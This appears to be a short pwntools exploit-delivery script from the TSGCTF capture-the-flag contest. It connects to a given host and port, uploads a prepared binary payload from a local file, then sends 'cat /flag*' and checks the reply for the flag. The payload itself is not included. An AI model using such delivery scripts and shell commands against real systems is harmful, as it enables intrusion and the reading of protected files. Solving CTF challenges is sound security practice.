from pwn import *
import sys

host = sys.argv[1]
port = int(sys.argv[2])

io = remote(host, port)

with open("pwn", "rb") as f:
  data = f.read()[:-1]

io.recvuntil(b">")
io.sendline(str(int(len(data))).encode("ascii"))
io.recvuntil(b">")

#print("waiting")
#s = input()

io.sendline(data)

import time
time.sleep(1)
io.sendline(b"cat /flag*")
s = io.recvline()
print(s)
if b"TSGCTF" in s:
  exit(0)
else:
  exit(1)

